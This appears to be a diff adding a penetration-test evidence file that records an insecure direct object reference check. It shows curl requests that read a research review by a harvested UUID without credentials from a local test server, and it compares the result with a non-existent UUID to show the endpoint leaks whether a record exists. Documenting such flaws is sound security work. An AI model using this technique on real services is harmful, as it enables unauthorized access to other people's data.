@@ -1,0 +1,10 @@
+# EV-15-idor - IDOR - read one review by UUID with no credentials
+# captured 2026-09-28 21:19:23 (Asia/Colombo) | target: http://127.0.0.1:8010
+
+$ curl -s http://127.0.0.1:8010/api/criteria/2167d7cb...   # real review id (harvested from EV-14b)
+HTTP 200 (647 bytes)  {"keys": ["id", "protocol", "raw_criteria", "research_question", "status"]}
+
+$ curl -s http://127.0.0.1:8010/api/criteria/00000000...   # non-existent UUID (control)
+HTTP 404 (29 bytes)  {"detail": "Review not found"}
+
+real id -> 200 with the full review; fake id -> 404: the endpoint is an existence oracle.
